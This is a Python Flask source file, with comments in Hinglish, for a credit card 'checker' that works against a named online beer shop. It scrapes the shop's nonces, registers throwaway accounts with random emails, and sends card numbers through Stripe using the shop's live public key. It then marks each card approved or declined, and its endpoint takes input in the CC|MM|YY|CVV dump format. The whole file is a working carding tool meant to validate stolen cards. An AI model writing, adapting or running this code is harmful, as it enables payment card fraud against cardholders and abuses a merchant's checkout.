from flask import Flask, request, jsonify
import requests
import re
import random
import string

app = Flask(__name__)

# ==================== WEBSITE BASED CHECKER (RECOMMENDED) ====================
def check_card_website(cc, mm, yy, cvv):
    session = requests.Session()
    
    # Real Browser jaisa headers (Zaroori hai)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://shop.wiseacrebrew.com/',
        'Origin': 'https://shop.wiseacrebrew.com'
    }
    session.headers.update(headers)

    # Year format fix
    if len(str(yy)) == 4:
        yy = str(yy)[-2:]

    try:
        # Step 1: Site ka login page kholo taaki cookies aaye
        r = session.get("https://shop.wiseacrebrew.com/account/", timeout=10)
        
        # Step 2: Nonce (Security Token) nikalo
        nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', r.text)
        if not nonce_match:
            return {"status": "Error", "response": "Site Load Fail (Nonce)"}
        
        register_nonce = nonce_match.group(1)

        # Step 3: Random email se fake account banao
        random_email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"
        
        register_data = {
            'email': random_email,
            'password': 'Test@12345',
            'woocommerce-register-nonce': register_nonce,
            '_wp_http_referer': '/account/',
            'register': 'Register'
        }
        
        # Register request
        session.post("https://shop.wiseacrebrew.com/account/", data=register_data, timeout=10)

        # Step 4: Payment page se Payment Nonce nikalo
        pay_page = session.get("https://shop.wiseacrebrew.com/account/add-payment-method/", timeout=10)
        pay_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', pay_page.text)
        
        if not pay_nonce_match:
            return {"status": "Error", "response": "Payment Page Fail"}
            
        ajax_nonce = pay_nonce_match.group(1)

        # Step 5: Stripe se Token maango (Site ke through)
        # Ye wahi Public Key hai jo site use karti hai
        stripe_payload = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'key': 'pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy'
        }
        
        # Stripe API Call
        stripe_res = session.post("https://api.stripe.com/v1/payment_methods", data=stripe_payload, timeout=10)
        stripe_json = stripe_res.json()

        # Agar Stripe ne error diya (Card Invalid)
        if 'error' in stripe_json:
            return {"status": "Declined", "response": stripe_json['error'].get('message', 'Stripe Error')}

        pm_id = stripe_json.get('id')
        if not pm_id:
            return {"status": "Error", "response": "No Token from Stripe"}

        # Step 6: Final Check - Card Add karne ki koshish
        final_payload = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce
        }
        
        final_res = session.post("https://shop.wiseacrebrew.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", data=final_payload, timeout=10)
        final_json = final_res.json()

        # Result Check
        if final_json.get('status') == 'succeeded':
            return {"status": "Approved", "response": "Card Auth Successful"}
        elif 'error' in str(final_json).lower():
             return {"status": "Declined", "response": "Card Declined by Bank"}
        else:
             return {"status": "Declined", "response": "Unknown Response"}

    except Exception as e:
        return {"status": "Error", "response": f"Exception: {str(e)[:30]}"}

# ==================== FLASK ENDPOINT ====================
@app.route('/check', methods=['GET'])
def check():
    cc = request.args.get('cc')
    if not cc:
        return jsonify({"status": "Error", "response": "Missing CC"})

    parts = cc.split('|')
    if len(parts) != 4:
        return jsonify({"status": "Error", "response": "Format: CC|MM|YY|CVV"})

    cc, mm, yy, cvv = parts
    res = check_card_website(cc, mm, yy, cvv)
    
    return jsonify(res)

if __name__ == '__main__':
    app.run(debug=True)
